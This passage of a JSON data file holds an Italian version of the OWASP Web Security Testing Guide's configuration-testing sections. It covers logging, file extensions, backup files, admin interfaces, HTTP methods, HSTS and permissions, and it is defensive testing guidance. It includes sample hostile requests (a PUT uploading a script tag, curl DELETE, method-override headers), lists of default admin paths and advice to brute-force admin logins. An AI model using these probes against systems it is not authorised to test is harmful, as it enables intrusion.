pool.</li><li>Non condividere applicationHost.config, redirection.config e administration.config in rete. In caso di Shared Configuration, esportare applicationHost.config in una posizione separata.</li><li>Tutti gli utenti possono leggere per default machine.config e rootweb.config del .NET Framework: non memorizzare informazioni sensibili in questi file se non strettamente necessario.</li><li>Cifrare i dati sensibili leggibili solo dai processi IIS worker e non da altri utenti della macchina.</li><li>Non concedere permessi di scrittura all’identità usata dal Web server per accedere a applicationHost.config condiviso: solo permessi di lettura.</li><li>Usare una identità separata per pubblicare applicationHost.config nella share; non usarla per configurare l’accesso condiviso sui web server.</li><li>Usare password robuste per esportare chiavi di cifratura su configurazione condivisa.</li><li>Mantenere accesso ristretto alle share di configurazione e alle chiavi di cifratura: in caso di compromissione, un attaccante potrebbe manipolare le configurazioni IIS o prendere il controllo dei server.</li><li>Proteggere la share con firewall e policy IPsec permettendo solo ai server membri di connettersi.</li></ul><p>Il logging è fondamentale per la sicurezza di un’architettura applicativa: permette di individuare errori e attacchi, come accessi anomali o tentativi di recupero di file non esistenti. I server in genere generano correttamente i log, mentre le applicazioni spesso loggano solo a scopo di debug, raramente con finalità di sicurezza.</p><p>Nei log (sia di server che applicazione) vanno analizzati e testati vari aspetti:</p><p>Alcune applicazioni inviano dati via GET, che finiscono nei log del server e possono includere informazioni sensibili (username, password, dettagli bancari). Un attaccante che accede ai log (tramite interfacce admin o vulnerabilità note/misconfigurazioni, come server-status su Apache) può sfruttare questi dati.</p><p>Gli event log possono contenere informazioni utili per un attaccante o sfruttabili direttamente, come:</p><ul><li>Informazioni di debug</li><li>Stack trace</li><li>Username</li><li>Nomi componenti di sistema</li><li>IP interni</li><li>Dati personali (email, indirizzo, telefono)</li><li>Dati di business</li></ul><p>In alcune giurisdizioni, il salvataggio di dati sensibili nei log obbliga a rispettare le stesse normative di protezione dati previste per i database backend; la mancata conformità può portare a sanzioni anche se involontaria.</p><p>Altri dati sensibili da evitare nei log:</p><ul><li>Codice sorgente</li><li>Session ID</li><li>Token di accesso</li><li>Dati personali sensibili e PII</li><li>Password di autenticazione</li><li>Stringhe di connessione a database</li><li>Chiavi di cifratura</li><li>Dati bancari</li><li>Dati di classificazione superiore rispetto al sistema di log</li><li>Dati sensibili a livello commerciale</li><li>Informazioni che non è legale raccogliere</li><li>Informazioni per cui l’utente ha negato o revocato il consenso</li></ul><p>Normalmente i server generano log locali, occupando disco. Se il server è compromesso, l’attaccante può cancellare i log per eliminare le tracce: molti rootkit includono tool (“log zapper”) per cancellare selettivamente i log. Meglio quindi salvare i log su una macchina separata, facilitando anche l’aggregazione di log da più server e l’analisi senza impattare sulle performance.</p><p>Una cattiva gestione dei log può creare condizioni di Denial of Service: un attaccante potrebbe saturare lo spazio disco generando traffico. Se i log sono scritti sulla stessa partizione dell’OS o dell’applicazione, un disco pieno può bloccare tutto. Sui sistemi UNIX i log sono in genere in /var (ma possono trovarsi anche in /opt o /usr/local): meglio separarli su partizioni dedicate.</p><p>I log devono essere monitorati per evitare che riempiano il filesystem: una crescita improvvisa può essere sintomo di attacco.</p><p>Testare questo scenario può essere rischioso in produzione, ma si può simulare generando molte richieste e verificando che vengano loggate e che i log possano saturare lo spazio. In ambienti dove si loggano anche i parametri QUERY_STRING, grandi query possono riempire più rapidamente i log.</p><p>I server (ma poche custom app) ruotano i log per non saturare il filesystem. La log rotation presuppone che i dati restino disponibili per un tempo limitato. È importante verificare che:</p><ul><li>I log siano mantenuti per il periodo definito dalla policy, né di più né di meno.</li><li>I log ruotati siano compressi.</li><li>I permessi dei log ruotati siano uguali o più restrittivi di quelli originali: il web server deve scrivere i log ma non deve poter modificare quelli già ruotati.</li></ul><p>Alcuni server ruotano i log al raggiungimento di una certa dimensione: attenzione che un attaccante non possa forzare la rotazione per coprire le tracce.</p><p>I log non devono mai essere accessibili agli utenti, né tantomeno agli amministratori di web app se viola la segregazione dei ruoli. Assicurarsi che il controllo accessi dei log sia separato da quello delle app. Nessun dato di log deve essere visibile a utenti non autenticati.</p><p>La revisione dei log può essere utile non solo per statistiche di utilizzo, ma anche per individuare attacchi sul web server.</p><p>Per analizzare gli attacchi, concentrarsi sui log di errore:</p><ul><li>Errori 40x (not found): tanti accessi dallo stesso IP possono indicare uno scanner CGI.</li><li>Errori 50x (server error): spesso segnalano abusi dell’applicazione (es. SQLi con query malformate che falliscono sul backend).</li></ul><p>Le statistiche o l’analisi dei log non vanno mai generate o salvate sullo stesso server che li produce: un attaccante potrebbe comunque accedervi tramite vulnerabilità o configurazioni errate.</p><h3>Riferimenti</h3><ul><li>Apache Security, Ivan Ristic, O’Reilly, 2005</li><li>Apache Security Secrets: Revealed (Again), Mark Cox, 2003</li><li>Apache Security Secrets: Revealed, ApacheCon 2002, Mark J Cox</li><li>Performance Tuning</li><li>Lotus Domino: Lotus Security Handbook, William Tworek et al., IBM Redbooks 2004; Lotus Domino Security, X-Force, ISS 2002; Hackproofing Lotus Domino Web Server, David Litchfield, 2001</li><li>Microsoft IIS: Security Best Practices for IIS 8; CIS Microsoft IIS Benchmarks; Securing Your Web Server, Microsoft 2004; IIS Security and Programming Countermeasures, Jason Coombs; From Blueprint to Fortress, John Davis, Microsoft 2001; Secure IIS 5 Checklist, Michael Howard, Microsoft 2000</li><li>Red Hat/iPlanet: Guide to the Secure Configuration and Administration of iPlanet Web Server, James M Hayes, NSA 2001</li><li>WebSphere: IBM WebSphere V5.0 Security, Peter Kovari et al., IBM 2002; IBM WebSphere V4.0 Advanced Edition Security, IBM 2002</li><li>Logging: Logging Cheat Sheet, OWASP; SP 800-92, NIST; PCI DSS v3.2.1 Req 10, PA-DSS v3.2 Req 4, PCI SSC; CERT Security Improvement Modules: Securing Public Web Servers</li></ul>",
      "tools": "",
      "remediation": "",
      "test_objectives": ""
    },
    "WSTG-CONF-03": {
      "summary": "<h3>Sommario</h3><p>I web server utilizzano comunemente le estensioni dei file per determinare quali tecnologie, linguaggi e plugin devono essere utilizzati per soddisfare le richieste web. Sebbene ciò sia coerente con gli standard RFC e Web Standards, l’uso di estensioni standard fornisce informazioni preziose al penetration tester sulle tecnologie sottostanti utilizzate da una web application e semplifica notevolmente la definizione degli scenari di attacco da adottare. Inoltre, una cattiva configurazione del web server può facilmente rivelare informazioni confidenziali come credenziali di accesso.</p><p>Il controllo delle estensioni dei file è spesso utilizzato per validare i file prima dell’upload sul server. Upload non controllati possono portare a risultati imprevisti, perché il contenuto caricato può non essere quello atteso, oppure per via di comportamenti inaspettati del sistema operativo nella gestione dei nomi file.</p><p>Capire come i web server gestiscono le richieste per file con estensioni diverse permette di chiarire il comportamento del server rispetto ai tipi di file: ad esempio, aiuta a capire quali estensioni vengono restituite come testo o download e quali provocano esecuzione lato server. Le seconde sono indicative di tecnologie, linguaggi o plugin presenti nel web server o application server, e forniscono ulteriori dettagli sull’architettura della web application. Ad esempio, l’estensione “.pl” suggerisce la presenza di Perl server-side, ma non sempre l’estensione riflette la tecnologia effettiva: risorse scritte in Perl possono essere rinominate per mascherarne l’uso. (Vedi anche la sezione sui componenti server-side per dettagli sull’identificazione delle tecnologie).</p><h3>Obiettivi del test</h3><ul><li>Effettuare brute force su estensioni di file sensibili che potrebbero contenere dati grezzi come script, credenziali, ecc.</li><li>Verificare che non esistano bypass dei framework di sistema rispetto alle regole definite.</li></ul>",
      "how-to": "<h3>Come testare</h3><p>Inviare richieste con estensioni di file diverse e verificare come vengono gestite dal server. La verifica va effettuata per ogni directory web. Occorre individuare le directory che consentono l’esecuzione di script. Queste directory possono essere individuate tramite tool di scansione che cercano la presenza di directory note. Anche il mirroring della struttura del sito aiuta i tester a ricostruire l’albero delle directory servite dall’applicazione.</p><p>Se l’architettura della web application è in load balancing, è importante valutare tutti i web server coinvolti. La complessità dell’operazione dipende dalla configurazione della bilanciamento: in infrastrutture ridondanti potrebbero esserci differenze tra le configurazioni dei singoli server web o application server, specialmente se si utilizzano tecnologie eterogenee (ad esempio IIS e Apache nello stesso cluster), con possibili asimmetrie e vulnerabilità diverse.</p><p>Se viene identificato un file come connection.inc e si riesce ad accedervi direttamente, si possono visualizzare dati sensibili, come in questo esempio:</p><pre><code><? mysql_connect ( \"127.0.0.1\" , \"root\" , \"password\" ) or die ( \"Could not connect\" ); ?></code></pre><p>Qui il tester deduce la presenza di un backend MySQL e l’uso di credenziali deboli da parte dell’applicazione.</p><p>Le seguenti estensioni non dovrebbero mai essere restituite da un web server perché possono contenere informazioni sensibili o non hanno motivo di essere servite:</p><ul><li>.asa</li><li>.inc</li><li>.config</li></ul><p>Altre estensioni corrispondono a file che vengono mostrati o scaricati dal browser: vanno controllate per assicurarsi che sia davvero previsto (e che non contengano dati sensibili):</p><ul><li>.zip, .tar, .gz, .tgz, .rar, ecc.: archivi compressi</li><li>.java: non c’è motivo di esporre sorgenti Java</li><li>.txt: file di testo</li><li>.pdf: documenti PDF</li><li>.docx, .rtf, .xlsx, .pptx, ecc.: documenti Office</li><li>.bak, .old e altre estensioni di backup (es. ~ per i backup Emacs)</li></ul><p>L’elenco è solo parziale, per una lista esaustiva si rimanda a FILExt.</p><p>Per individuare i file con una data estensione si possono usare più tecniche: vulnerability scanner, spidering, mirroring, motori di ricerca (vedi sezione su Spidering e googling). L’ispezione manuale è spesso efficace, specie dove i tool automatici falliscono. (Vedi anche Testing for Old, Backup and Unreferenced Files per la gestione dei file “dimenticati”).</p><p>La gestione dei file legacy Windows 8.3 può essere sfruttata per aggirare i filtri sugli upload.</p><p>Esempi d’uso:</p><p>Nel white-box testing si controllano le configurazioni del server web e si verifica la gestione delle diverse estensioni file.</p><p>Se l’applicazione si basa su un’infrastruttura load-balanced eterogenea, verificare se ciò introduce comportamenti diversi nei vari server.</p>",
      "tools": "<h3>Strumenti</h3><p>Vulnerability scanner come Nessus e Nikto cercano directory e file noti nei web server. Questi tool permettono anche di scaricare la struttura del sito, utile per analizzare la configurazione delle directory e la gestione delle estensioni. Altri tool utili:</p><ul><li>wget</li><li>curl</li><li>Cerca su Google “web mirroring tools”</li></ul>",
      "remediation": "",
      "test_objectives": ""
    },
    "WSTG-CONF-04": {
      "summary": "<h3>Sommario</h3><p>Anche se la maggior parte dei file presenti su un web server viene gestita direttamente dal server stesso, non è raro trovare file non referenziati o dimenticati che possono essere utilizzati per ottenere informazioni importanti sull’infrastruttura o sulle credenziali.</p><p>Gli scenari più comuni includono la presenza di vecchie versioni rinominate di file modificati, file di inclusione caricati nel linguaggio scelto e scaricabili come sorgente, oppure backup automatici o manuali in formato archivio compresso. I file di backup possono anche essere generati automaticamente dal file system sottostante, funzionalità spesso indicata come “snapshots”.</p><p>Tutti questi file possono permettere al tester di accedere al funzionamento interno, backdoor, interfacce amministrative o anche alle credenziali per connettersi all’interfaccia di amministrazione o al database.</p><p>Un’importante fonte di vulnerabilità è rappresentata da file non direttamente collegati all’applicazione. Questi file possono essere creati durante la modifica dei file applicativi, creando copie di backup temporanee, oppure lasciando file vecchi o non referenziati nella webroot. Modifiche in-place o altre attività amministrative su server di produzione possono lasciare copie di backup, sia generate automaticamente dall’editor, sia manualmente dall’amministratore che comprime i file per un backup.</p><p>È facile dimenticare questi file, e questo può rappresentare una seria minaccia alla sicurezza. Ciò avviene perché le copie di backup possono avere estensioni diverse da quelle originali (.tar, .zip, .gz, .old, ~, ecc.). Anche il file system sottostante può generare snapshot accessibili via web, aumentando il rischio.</p><p>Di conseguenza, queste attività generano file che non sono necessari all’applicazione e possono essere gestiti dal web server in modo diverso rispetto all’originale. Ad esempio, se copio login.asp come login.asp.old senza adottare misure di sicurezza, è possibile che un utente scarichi il codice sorgente di login.asp, perché login.asp.old verrà servito come testo semplice. Questo può rivelare informazioni sensibili.</p><p>Esporre codice server-side è sempre una cattiva idea: si espone logica di business e si possono rivelare dettagli utili all’attaccante (path, strutture dati, ecc.), senza contare che spesso sono presenti script con username e password in chiaro.</p><p>Altri file non referenziati derivano da scelte progettuali o di configurazione che permettono di salvare file applicativi come dati, configurazioni o log in directory accessibili via web server: questi file dovrebbero essere accessibili solo a livello applicativo e non dall’utente comune.</p><p>I file vecchi, di backup o non referenziati rappresentano varie minacce:</p><ul><li>Possono rivelare informazioni sensibili (es. credenziali, configurazioni, path, ecc.).</li><li>Pagine non referenziate possono contenere funzionalità potenti (es. pagine di amministrazione accessibili conoscendo l’URL).</li><li>File vecchi/backup possono contenere vulnerabilità corrette nelle versioni recenti (es. viewdoc.old.jsp vulnerabile alla traversata directory rispetto a viewdoc.jsp).</li><li>I backup possono rivelare il codice sorgente di pagine server-side (es. viewdoc.bak che mostra il sorgente di viewdoc.jsp), utile per individuare vulnerabilità difficili da trovare con richieste “alla cieca”.</li><li>Archivi di backup possono contenere copie di tutti i file della webroot o di percorsi esterni, esponendo l’intera applicazione (es. myservlets.jar.old con classi decompilabili).</li><li>File duplicati creati da copia/edit possono mantenere la stessa estensione (es. “Copy of ...” su Windows): anche se non rivelano codice, possono contenere logica obsoleta e generare errori utili a un attaccante.</li><li>I file di log possono contenere dati sensibili sulle attività degli utenti, parametri di URL, session ID, URL visitati o informazioni di manutenzione amministrativa.</li><li>Snapshot del file system possono includere codice vulnerabile non più presente nella versione attuale (es. /.snapshot/monthly.1/view.php).</li></ul><h3>Obiettivi del test</h3><ul><li>Individuare e analizzare file non referenziati che potrebbero contenere informazioni sensibili.</li></ul>",
      "how-to": "<h3>Come testare</h3><p>La ricerca di file non referenziati prevede tecniche sia automatiche che manuali, e in genere combina:</p><p>Enumerare tutte le pagine e funzionalità dell’applicazione, manualmente tramite browser o con tool di spidering. Spesso le applicazioni seguono schemi di naming prevedibili che permettono di indovinare nomi e percorsi di pagine non referenziate. Ad esempio, trovando viewuser.asp, cercare anche edituser.asp, adduser.asp, deleteuser.asp; scoprendo /app/user, cercare anche /app/admin, /app/manager.</p><p>I contenuti pubblici possono contenere indizi su pagine o funzionalità nascoste, rilevabili nel codice sorgente HTML/JavaScript. Esempi:</p><ul><li>Commenti e sezioni commentate che fanno riferimento a contenuti nascosti:</li></ul><pre><code><!-- <A HREF=\"uploadfile.jsp\">Upload a document to the server</A> --></code></pre><ul><li>Javascript con link visibili solo in certe condizioni:</li></ul><pre><code>var adminUser = false ; if ( adminUser ) menu . add ( new menuItem ( \"Maintain users\", \"/admin/useradmin.jsp\" ));</code></pre><ul><li>FORM HTML con elementi SUBMIT disabilitati:</li></ul><pre><code><form action=\"forgotPassword.jsp\" method=\"post\"><input type=\"hidden\" name=\"userID\" value=\"123\"><!-- <input type=\"submit\" value=\"Forgot Password\"> --></form></code></pre><p>Altra fonte di indizi è il file /robots.txt, che può rivelare directory da escludere:</p><pre><code>User-agent: *\nDisallow: /Admin\nDisallow: /uploads\nDisallow: /backup\nDisallow: /~jbloggs\nDisallow: /include</code></pre><p>La tecnica più semplice consiste nell’inviare una wordlist di nomi file comuni tramite uno script che esegue richieste HTTP e registra i codici di risposta (200, 301, 302, 401, 403, 500, ecc.) per identificare risorse esistenti o interessanti. Questa operazione va fatta sia sulla root sia sulle directory scoperte in fase di enumerazione. Approcci più avanzati prevedono:</p><ul><li>Identificare le estensioni usate nelle aree note e usare wordlist arricchite con quelle estensioni.</li><li>Per ogni file trovato, creare una wordlist customizzata con varianti di nome ed estensione (es. ~, bak, txt, old, inc, orig, copy, tmp, ecc.).</li></ul><p>Nota: le copie di file su Windows usano prefissi come “Copy of ...” senza modificare l’estensione: questi file, pur non mostrando il codice sorgente, possono fornire informazioni se causano errori in esecuzione.</p><p>Un server mal configurato può esporre directory listing: verificare se sono attive su tutte le directory enumerate.</p><p>Vulnerabilità note permettono di elencare contenuti non referenziati, come:</p><ul><li>Apache ?M=D directory listing vulnerability</li><li>Diversi bug IIS su disclosure di sorgenti script</li><li>Vulnerabilità directory listing IIS WebDAV</li></ul><p>Le pagine non referenziate possono essere comunque pubblicate tramite link esterni o ancora presenti negli archivi dei motori di ricerca (site:), oppure come versioni cache di Google/Yahoo. Le Google Dorks sono utili per affinare la ricerca di file nascosti.</p><p>I filtri basati su deny list (regex) possono essere aggirati sfruttando caratteristiche particolari di espansione dei nomi file dell’OS (es. convenzioni 8.3 su Windows).</p><p>Il gray-box testing di file vecchi/backup prevede la revisione delle directory web servite, idealmente a mano, ma spesso automatizzata visto che i pattern di naming sono comuni (es. .old, .bak, ~, ecc.). È utile pianificare job periodici che verifichino la presenza di questi file e integrare con check manuali.</p>",
      "tools": "<h3>Strumenti</h3><p>I tool di vulnerability assessment verificano la presenza di directory standard (admin, test, backup, ecc.) e segnalano l’indicizzazione abilitata. In assenza di directory listing, vanno controllate le estensioni tipiche di backup. Tool utili:</p><ul><li>Nessus</li><li>Nikto2</li></ul><p>Strumenti di spidering:</p><ul><li>wget</li><li>Spike Proxy (funzione site crawler)</li><li>Xenu</li><li>curl</li></ul><p>Molti sono inclusi nelle principali distribuzioni Linux. I tool di sviluppo web spesso offrono funzioni per individuare broken link e file non referenziati.</p>",
      "remediation": "<h3>Mitigazione</h3><p>Per una protezione efficace, la fase di test va affiancata a policy di sicurezza che vietino pratiche pericolose, tra cui:</p><ul><li>Evitare di editare file in-place sui file system dei web/application server: questa prassi genera spesso file di backup/temporanei.</li><li>Controllare attentamente tutte le attività su file system esposti via web server, comprese attività amministrative spot. Se proprio si devono creare archivi, attenzione a non lasciarli accessibili.</li><li>Policy di gestione delle configurazioni devono prevenire la presenza di file obsoleti o non referenziati.</li><li>Le applicazioni dovrebbero essere progettate per non creare né gestire file sotto le directory servite dal web server: file dati, log, configurazioni, ecc. vanno sempre posti fuori dalla webroot per evitare leak o rischi di modifica dati.</li><li>Gli snapshot del file system non devono essere accessibili via web se la document root usa questa tecnologia: configurare il server per negare l’accesso (es. con direttiva Apache <Location ~ \".snapshot\"> Deny from all </Location>).</li></ul>",
      "test_objectives": ""
    },
    "WSTG-CONF-05": {
      "summary": "<h3>Sommario</h3><p>Le interfacce di amministrazione possono essere presenti nell'applicazione o sul server applicativo per consentire ad alcuni utenti di svolgere attività privilegiate sul sito. I test devono identificare se e come queste funzionalità privilegiate possono essere raggiunte da utenti non autorizzati o standard.</p><p>Un'applicazione può richiedere un'interfaccia amministrativa che permetta a un utente privilegiato di modificare il funzionamento del sito. Queste modifiche possono includere:</p><ul><li>gestione degli account utente</li><li>modifica del design e del layout</li><li>manipolazione dei dati</li><li>cambi di configurazione</li></ul><p>Spesso tali interfacce non dispongono di controlli sufficienti a proteggerle da accessi non autorizzati. Il testing è finalizzato a scoprire queste interfacce di amministrazione e tentare di accedere alle funzioni pensate per gli utenti privilegiati.</p><h3>Obiettivi del test</h3><ul><li>Identificare interfacce e funzionalità amministrative nascoste.</li></ul>",
      "how-to": "<h3>Come testare</h3><p>Di seguito sono riportati i vettori principali per individuare interfacce amministrative. Le tecniche descritte possono essere utili anche per rilevare privilege escalation e sono approfondite in altre sezioni della guida (es. bypass schema autorizzativi, IDOR, ecc.).</p><ul><li><b>Enumerazione directory e file</b>: L'interfaccia di amministrazione può esistere ma non essere visibile. Il percorso può essere indovinato con richieste a /admin o /administrator. Spesso bastano pochi secondi con Google Dorks o tool di brute-forcing per individuare queste directory (vedi sezione strumenti). Può essere necessario anche identificare il nome esatto della pagina di amministrazione e tentare l’accesso diretto.</li><li><b>Commenti e link nel codice sorgente</b>: Esaminando tutto il codice HTML/JS inviato al client è possibile trovare riferimenti a funzionalità amministrative (inclusi link nascosti o commentati).</li><li><b>Revisione della documentazione server/applicativa</b>: Se il server/applicazione è installato con configurazione di default, l’interfaccia di amministrazione potrebbe essere accessibile secondo quanto riportato nella documentazione o nelle pagine di help. Consultare le liste di password di default in caso siano richieste credenziali.</li><li><b>Informazioni pubbliche</b>: Molte applicazioni (es. WordPress) espongono per impostazione predefinita interfacce di amministrazione pubbliche.</li><li><b>Porte alternative</b>: Le interfacce di amministrazione possono trovarsi su una porta diversa rispetto all’applicazione principale (es. Tomcat Admin su 8080).</li><li><b>Parameter tampering</b>: A volte è richiesto un parametro GET/POST o un cookie per abilitare la funzionalità admin. Ad esempio:</li></ul><pre><code><input type=\"hidden\" name=\"admin\" value=\"no\"></code></pre><p>o in un cookie:</p><pre><code>Cookie: session_cookie; useradmin=0</code></pre><p>Scoperta l’interfaccia, combinare queste tecniche per tentare di aggirare l’autenticazione. Se fallisce, tentare attacchi di brute-force (prestando attenzione a lockout/account blockati).</p><p>È fondamentale una revisione approfondita dei componenti server/applicativi per garantire il hardening (es. pagine admin protette da IP filtering o controlli adeguati) e verificare l’assenza di credenziali/configurazioni di default. Il codice sorgente va esaminato per accertarsi che il modello di autenticazione/autorizzazione garantisca netta separazione dei ruoli tra utenti normali e admin, e che le interfacce condivise non causino leak informativi.</p><p>Ogni framework ha suoi percorsi/pagine admin di default. Esempi:</p><ul><li><b>PHP</b>:<pre>/phpinfo /phpmyadmin/ /phpMyAdmin/ /mysqladmin/ /MySQLadmin /MySQLAdmin /login.php /logon.php /xmlrpc.php /dbadmin</pre></li><li><b>WordPress</b>:<pre>wp-admin/ wp-admin/about.php wp-admin/admin-ajax.php wp-admin/admin-db.php wp-admin/admin-footer.php wp-admin/admin-functions.php wp-admin/admin-header.php</pre></li><li><b>Joomla</b>:<pre>/administrator/index.php /administrator/index.php?option=com_login /administrator/index.php?option=com_content /administrator/index.php?option=com_users /administrator/index.php?option=com_menus /administrator/index.php?option=com_installer /administrator/index.php?option=com_config</pre></li><li><b>Tomcat</b>:<pre>/manager/html /host-manager/html /manager/text /tomcat-users.xml</pre></li><li><b>Apache</b>:<pre>/index.html /httpd.conf /apache2.conf /server-status</pre></li><li><b>Nginx</b>:<pre>/index.html /index.htm /index.php /nginx_status /nginx.conf /html/error</pre></li></ul>",
      "tools": "<h3>Strumenti</h3><ul><li><b>ZAP Forced Browse</b> (evoluzione di DirBuster): per individuare directory/pagine admin nascoste.</li><li><b>THC-HYDRA</b>: brute-forcing di interfacce admin (form-based HTTP authentication e altro).</li><li>Un dizionario di qualità (es. Netsparker admin paths) rende il brute-forcer molto più efficace.</li></ul><h3>Riferimenti</h3><ul><li>CIRT: Default Password List</li><li>FuzzDB per brute force admin login path</li><li>Common admin/debugging parameters</li></ul>",
      "remediation": "",
      "test_objectives": ""
    },
    "WSTG-CONF-06": {
      "summary": "<h3>Sommario</h3><p>HTTP offre diversi metodi (o verbi) che possono essere utilizzati per eseguire azioni sul web server. Anche se GET e POST sono i più comuni per accedere alle informazioni fornite dal server, esistono altri metodi che possono essere supportati e, talvolta, sfruttati da un attaccante.</p><p>La RFC 7231 definisce i principali metodi HTTP validi, ma altri sono stati aggiunti in ulteriori RFC (come la RFC 5789). Questi verbi sono spesso riutilizzati anche nelle API RESTful moderne, spesso con sfumature e rischi specifici per ciascuna implementazione.</p><h3>Obiettivi del test</h3><ul><li>Enumerare i metodi HTTP supportati.</li><li>Testare eventuali bypass di access control tramite metodi non previsti.</li><li>Testare tecniche di HTTP method override (sovrascrittura metodo).</li></ul>",
      "how-to": "<h3>Come testare</h3><p>Il primo passo consiste nell'identificare quali metodi HTTP sono supportati dal server. Il metodo più semplice è inviare una richiesta OPTIONS alla risorsa desiderata:</p><pre><code>OPTIONS / HTTP/1.1\nHost: example.org</code></pre><p>Il server dovrebbe rispondere con una lista dei metodi consentiti tramite l'header Allow, ad esempio:</p><pre><code>HTTP/1.1 200 OK\nAllow: OPTIONS, GET, HEAD, POST</code></pre><p>Non tutti i server però rispondono a OPTIONS, o potrebbero fornire informazioni incomplete. Inoltre, i metodi supportati possono variare a seconda del path richiesto.</p><p>Un approccio più affidabile è provare a inviare richieste con il metodo desiderato (es. PUT, DELETE, PATCH, ecc.) e osservare la risposta. Se il metodo non è permesso, il server dovrebbe restituire HTTP 405 Method Not Allowed.</p><p>Attenzione: alcuni server trattano metodi sconosciuti come GET, il che può consentire di eludere firewall applicativi o altri sistemi di filtraggio. Ad esempio:</p><pre><code>FOO / HTTP/1.1\nHost: example.org</code></pre><p>È possibile usare curl per inviare richieste con metodi arbitrari:</p><pre><code>curl -X FOO https://example.org</code></pre><p>Esistono anche strumenti automatizzati, come lo script http-methods di Nmap, che consentono di rilevare i metodi supportati, ma attenzione: metodi come PUT/DELETE possono essere realmente distruttivi o portare a exploit in ambiente reale.</p><p><b>PUT/DELETE</b>: storicamente, alcuni web server permettevano l’uso di PUT per caricare file (ad esempio una shell PHP). Oggi è raro trovarli abilitati, ma non è impossibile. DELETE, analogamente, può consentire di cancellare file.</p><pre><code>PUT /test.html HTTP/1.1\nHost: example.org\nContent-Length: 25\n\n<script>alert(1)</script></code></pre><pre><code>curl https://example.org --upload-file test.html</code></pre><pre><code>DELETE /test.html HTTP/1.1\nHost: example.org</code></pre><pre><code>curl https://example.org/test.html -X DELETE</code></pre><p>Sulle RESTful API, questi metodi sono spesso usati per creare/modificare/cancellare risorse (es. utenti). Il rischio non è nel verbo, ma nella (mancanza di) access control!</p><p><b>TRACE/TRACK</b>: Permettono di far riflettere la richiesta dal server al client. Storicamente utilizzati per attacchi XST (Cross Site Tracing), sono oggi disabilitati sui browser ma la loro presenza indica un server non hardenizzato.</p><p><b>CONNECT</b>: Consente di aprire una connessione TCP arbitraria tramite il server (proxy). Se abilitato può essere sfruttato per attacchi pivoting o internal recon.</p><p><b>PATCH</b>: Permette la modifica parziale di risorse (RFC 5789, RFC 6902). Spesso usato nelle API, può introdurre rischi di injection, XSS stored, o corruzione di oggetti se i controlli sono deboli.</p><p><b>Bypass con HTTP Method Override</b>: Alcuni framework consentono di specificare il metodo reale tramite header custom (es. X-HTTP-Method-Override), utile per eludere controlli lato proxy o WAF che bloccano alcuni metodi.</p><pre><code>X-HTTP-Method: DELETE\nX-HTTP-Method-Override: DELETE\nX-Method-Override: DELETE</code></pre><p>Test: Se una DELETE restituisce 405, riprova con GET e uno di questi header: se la risorsa viene comunque modificata o eliminata, c'è un problema di override gestito male.</p><p><b>Bypass auth/redirect</b>: In alcuni casi, endpoint admin potrebbero essere protetti solo per metodo GET/POST. Prova HEAD, OPTIONS, PATCH, o metodi custom: a volte permettono di bypassare redirect/login o innescare azioni non volute.</p>",
      "tools": "<h3>Strumenti</h3><ul><li>Ncat (netcat avanzato)</li><li>cURL</li><li>Nmap (script http-methods)</li></ul><h3>Riferimenti</h3><ul><li>RFC 7231 - Hypertext Transfer Protocol (HTTP/1.1)</li><li>RFC 5789 - PATCH Method for HTTP</li><li>HTACCESS: BILBAO Method Exposed</li><li>Fortify - Misused HTTP Method Override</li><li>Mozilla Developer Network - Safe HTTP Methods</li></ul>",
      "remediation": "<h3>Remediation</h3><ul><li>Abilitare solo i metodi effettivamente necessari e configurarli in modo sicuro.</li><li>Verificare che non siano presenti workaround o override non intenzionali che permettano il bypass delle misure di sicurezza imposte da framework, server o proxy.</li></ul>",
      "test_objectives": ""
    },
    "WSTG-CONF-07": {
      "summary": "<h3>Sommario</h3><p>La funzionalità HTTP Strict Transport Security (HSTS) permette al server web di segnalare al browser, tramite un header specifico, che tutte le richieste verso il dominio devono avvenire esclusivamente tramite HTTPS, impedendo connessioni non cifrate e mitigando attacchi di tipo MITM. Inoltre, questa policy impedisce agli utenti di ignorare errori sui certificati.</p><p>L’header HSTS più comune è:</p><pre><code>Strict-Transport-Security: max-age=31536000; includeSubDomains</code></pre><p>La presenza (e la corretta configurazione) di questo header va verificata, poiché la sua assenza può esporre a rischi come intercettazione del traffico, downgrade attack, furto di credenziali tramite phishing su HTTP o MITM.</p><h3>Obiettivi del test</h3><ul><li>Verificare la presenza dell’header HSTS e la sua validità.</li></ul>",
      "how-to": "<h3>Come testare</h3><ul><li>Analizza la risposta del server tramite un proxy (es. Burp Suite, OWASP ZAP) e cerca l’header <code>Strict-Transport-Security</code>.</li><li>Oppure usa curl:</li></ul><pre><code>$ curl -s -D- https://target.com | grep -i strict-transport-security</code></pre><p>Valuta se sono presenti le direttive <code>max-age</code>, <code>includeSubDomains</code> e, se richiesto, <code>preload</code> (per la registrazione nel preload list dei browser principali).</p><h3>Riferimenti</h3><ul><li>OWASP HTTP Strict Transport Security</li><li>OWASP AppSec Tutorial Series - Episode 4</li><li>HSTS Specification</li><li>Guida all’attivazione di HSTS su Apache/Nginx</li></ul>",
      "tools": "",
      "remediation": "",
      "test_objectives": ""
    },
    "WSTG-CONF-08": {
      "summary": "",
      "how-to": "",
      "tools": "",
      "remediation": "",
      "test_objectives": ""
    },
    "WSTG-CONF-09": {
      "summary": "<h3>Sommario</h3><p>Se una risorsa viene configurata con permessi più ampi del necessario, può causare la divulgazione di dati sensibili o la modifica di file/oggetti da parte di utenti non autorizzati. Questo rischio è particolarmente critico per file di configurazione, dati sensibili, script eseguibili, log e database.</p><p>Esempi frequenti includono file di configurazione world-readable, file di token/API accessibili da utenti normali o remoti, eseguibili lanciabili da utenti non privilegiati.</p><h3>Obiettivi del test</h3><ul><li>Individuare permessi eccessivi o errati su file e directory sensibili.</li></ul>",
      "how-to": "<h3>Come testare</h3><p>In ambiente Linux, usa <code>ls -l</code> o <code>namei -l /percorso/da/verificare/</code> per elencare permessi e proprietà. In Windows, strumenti come AccessEnum e AccessChk sono utili.</p><p>I path da verificare includono:</p><ul><li>File e cartelle web</li><li>File di configurazione</li><li>File sensibili (credenziali, chiavi, token)</li><li>Log di sicurezza e amministrazione</li><li>Eseguibili e script</li><li>Database</li><li>File temporanei e di upload</li></ul>",
      "tools": "<h3>Strumenti</h3><ul><li>Windows: AccessEnum, AccessChk (Sysinternals)</li><li>Linux: namei, ls -l</li></ul><h3>Riferimenti</h3><ul><li>CWE-732: Incorrect Permission Assignment for Critical Resource</li></ul>",
      "remediation": "<h3>Remediation</h3><p>Assegna permessi minimi indispensabili (principio del least privilege) e verifica che solo gli utenti autorizzati possano accedere o modificare file/directory critiche.</p>",
      "test_objectives": ""
    },
    "WSTG-CONF-10": {
